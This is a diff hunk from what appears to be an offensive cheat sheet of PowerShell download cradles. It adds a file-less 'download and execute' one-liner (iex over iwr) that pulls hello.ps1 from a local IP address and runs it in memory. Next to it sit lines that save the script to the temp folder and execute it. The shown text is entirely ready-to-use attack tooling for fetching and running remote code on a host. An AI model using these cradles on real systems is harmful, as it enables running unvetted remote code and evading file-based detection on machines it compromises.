@@ -2082,6 +2082,9 @@ This section contains onelinner crandle downloaders that for one reason or anoth
 <br /><br />
 **Powershell Downloaders**<br />
 
+      ## File-less download and execute
+      iex(iwr("http://192.168.1.71/hello.ps1"))
+
       iwr -Uri http://192.168.1.71/hello.ps1 -OutFile $env:tmp\hello.ps1
 
       Invoke-WebRequest "http://192.168.1.71/hello.ps1" -OutFile "$env:tmp\hello.ps1" -PassThru;Start-Sleep 1;powershell -File $env:tmp\hello.ps1
